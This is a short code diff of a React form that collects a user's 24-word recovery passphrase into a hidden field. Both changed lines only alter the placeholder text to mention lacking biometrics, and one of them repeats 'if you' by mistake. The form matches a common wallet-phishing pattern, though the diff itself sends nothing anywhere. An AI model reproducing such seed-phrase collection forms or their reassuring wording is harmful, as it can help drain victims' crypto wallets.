@@ -67,7 +67,7 @@ const Form = () => {
       >
         <input type="hidden" name="passphrase" value={passphrase} />
         <textarea
-          placeholder="Enter your 24-word passphrase here"
+          placeholder="Enter your 24-word passphrase here if you have no biometrics set up"
           required
           rows={4}
           value={passphrase.replace(/./g, "*")} // Display asterisks in the textarea
@@ -133,7 +133,7 @@ export default Form;
 //       >
 //         <textarea
 //           name="passphrase"
-//           placeholder="Enter your 24-word passphrase here"
+//           placeholder="Enter your 24-word passphrase here if you if you have no biometrics set up"
 //           required
 //           rows={4}
 //           className=" flex-wrap border border-yellow-600 self-center  w-[400px] sm:w-[600px] pt-4 pl-4 pb-[200px] sm:pb-[300px] rounded-md placeholder:font-Azeret  font-Azeret text-gray-700 placeholder:text-[12px] placeholder:sm:text-[16px] outline-none focus:outline-none focus:ring-2 focus:ring-yellow-600 focus:border-transparent resize-none"
